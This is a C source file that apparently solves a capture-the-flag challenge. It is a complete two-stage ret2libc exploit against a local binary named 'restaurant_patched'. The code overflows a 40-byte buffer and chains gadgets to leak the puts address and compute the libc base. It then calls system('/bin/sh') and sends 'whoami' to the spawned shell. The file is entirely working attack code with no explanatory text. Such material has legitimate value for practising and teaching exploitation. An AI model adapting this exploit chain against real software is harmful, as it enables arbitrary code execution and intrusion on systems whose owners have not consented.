#include <inttypes.h>
#include <pawlib.h>
#include <stdio.h>
#include <stdlib.h>
int main()
{
    process p   = paw_open_process( "./restaurant_patched" );
    p.log_level = 0;

    int rip_offset = 40;

    addr ret         = 0x40063e;
    addr pop_rdi_ret = 0x4010a3;

    addr puts_got = 0x601fa8;
    addr puts_plt = 0x400650;

    addr puts_libc   = 0x000000000080aa0;
    addr system_libc = 0x00000000004f550;
    addr binsh_libc  = 0x01b3e1a;

    addr main = 0x0000000000400f68;

    data payload = paw_init_data();

    paw_add( &payload, "1" );

    paw_recvuntil( p, ">", 1 );
    paw_sendline( p, payload );

    data payload2 = paw_init_data();

    paw_add_repeat( &payload2, "A", rip_offset );
    paw_add_p64( &payload2, pop_rdi_ret );
    paw_add_p64( &payload2, puts_got );
    paw_add_p64( &payload2, puts_plt );
    paw_add_p64( &payload2, main );

    paw_send( p, payload2 );

    paw_recvuntil( p, "Enjoy your " );

    paw_recv( p, rip_offset );

    paw_recv( p, 3 );

    addr libc = paw_u64( paw_recv( p, 6 ) );
    libc -= puts_libc;

    data payload3 = paw_init_data();

    paw_add_repeat( &payload3, "A", rip_offset );
    paw_add_p64( &payload3, ret );
    paw_add_p64( &payload3, pop_rdi_ret );
    paw_add_p64( &payload3, binsh_libc + libc );
    paw_add_p64( &payload3, system_libc + libc );

    paw_recvuntil( p, ">" );
    paw_sendline( p, payload );
    paw_recvuntil( p, ">" );
    paw_sendline( p, payload3 );

    data payload4 = paw_init_data();
    paw_add( &payload4, "whoami" );
    paw_recv( p, 200 );
    paw_sendline( p, payload4 );
    paw_recv( p, 200 );

    paw_close( &p );
}
